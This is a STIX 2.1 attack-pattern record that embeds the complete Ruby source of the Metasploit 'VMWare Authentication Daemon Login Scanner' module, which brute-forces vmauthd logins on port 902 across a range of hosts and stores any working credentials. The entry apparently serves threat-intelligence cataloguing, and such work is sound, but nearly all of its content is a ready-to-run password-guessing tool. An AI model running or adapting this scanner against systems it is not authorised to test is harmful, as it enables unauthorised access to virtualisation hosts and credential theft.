{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d3d7920e-fa40-4a4b-a8f2-4b75313ea520",
    "created": "2024-08-14T16:27:39.181497Z",
    "modified": "2024-08-14T16:27:39.1815Z",
    "name": "VMWare Authentication Daemon Login Scanner",
    "description": "This module will test vmauthd logins on a range of machines and report successful logins. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/vmware/vmauthd_login.rb",
            "external_id": "vmauthd_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/vmauthd'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  @@cached_rsa_key = nil\n\n  def initialize\n    super(\n      'Name'        => 'VMWare Authentication Daemon Login Scanner',\n      'Description' => %q{This module will test vmauthd logins on a range of machines and\n                report successful logins.\n      },\n      'Author'      => ['theLightCosine'],\n      'References'  =>\n        [\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options([Opt::RPORT(902)])\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def run_host(ip)\n    print_brute :ip => ip, :msg => 'Starting bruteforce'\n\n    # Perform a sanity check to ensure that our target is vmauthd before\n    # attempting to brute force it.\n    begin\n      connect rescue nil\n      if !self.sock\n        print_brute :level => :verror, :ip => ip, :msg => 'Could not connect'\n        return\n      end\n      banner = sock.get_once(-1, 10)\n      if !banner || !banner =~ /^220 VMware Authentication Daemon Version.*/\n        print_brute :level => :verror, :ip => ip, :msg => 'Target does not appear to be a vmauthd service'\n        return\n      end\n\n      rescue ::Interrupt\n      raise $ERROR_INFO\n    ensure\n      disconnect\n    end\n\n    cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::VMAUTHD.new(\n      host: ip,\n      port: rport,\n      proxies: datastore['PROXIES'],\n      cred_details: cred_collection,\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n      connection_timeout: 30,\n      max_send_size: datastore['TCP::max_send_size'],\n      send_delay: datastore['TCP::send_delay'],\n      framework: framework,\n      framework_module: self,\n      ssl: datastore['SSL'],\n      ssl_version: datastore['SSLVersion'],\n      ssl_verify_mode: datastore['SSLVerifyMode'],\n      ssl_cipher: datastore['SSLCipher'],\n      local_port: datastore['CPORT'],\n      local_host: datastore['CHOST']\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      case result.status\n        when Metasploit::Model::Login::Status::SUCCESSFUL\n          print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\\r\\n\\e\\b\\a]/, ' ')}'\"\n          credential_core = create_credential(credential_data)\n          credential_data[:core] = credential_core\n          create_credential_login(credential_data)\n          :next_user\n        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => 'Could not connect'\n          end\n          invalidate_login(credential_data)\n          :abort\n        when Metasploit::Model::Login::Status::INCORRECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}' #{result.proof}\"\n          end\n          invalidate_login(credential_data)\n      end\n    end\n  end\nend\n"
}